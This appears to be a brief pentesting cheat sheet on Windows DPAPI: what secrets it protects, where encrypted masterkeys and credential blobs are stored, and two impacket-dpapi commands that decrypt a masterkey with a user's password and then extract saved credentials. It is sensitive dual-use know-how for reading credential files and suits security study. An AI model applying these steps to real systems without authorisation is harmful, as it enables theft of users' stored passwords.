
#### DPAPI 

DPAPI is a windows' built-in encryption system for protecting sensitive data — like saved passwords, certificates and secrets — tied to a user or machine


It can protect : 
- Saved Creds (RDP, SMB, VPN)
- Browser Passwords
- Wifi keys
- Outlook, Windows Vault, Credential Manager entries
- chrome cookies 


#### Working Mechanism

1. Data is encrypted with **CryptProtectData()**
2. This uses a Master Key, which is stored encrypted in :
	- `C:\Users\username\appdata\Roaming\Microsoft\Protect\SID\`


3. This MasterKey is encrypted with :
	- The user's password (or)
	- The machine's system key




#### Credential extraction from encrypted Credential blobs


If we have access to a user's password, we can attempt to decrypt their DPAPI masterkey. We can utilise this decrypted masterkey to extract credentials from the encrypted Credential blob stored in : 

```Powershell
C:\Users\username\appdata\Roaming\Microsoft\Credentials\
```



#### Impacket-dpapi


Once we have locally saved the encrypted masterkey and the encrypted credential blob, we can use `impacket-dpapi` to decrypt the credential blob.



1. Decrypting the masterkey

```bash
impacket-dpapi -master <masterkeyfile> -sid SID -password <password_of_the_user>
```



2. Decrypting the credential blob

```bash
impacket-dpapi -key <decrypted_master_key> -cred <encrypted_cred_blob>
```
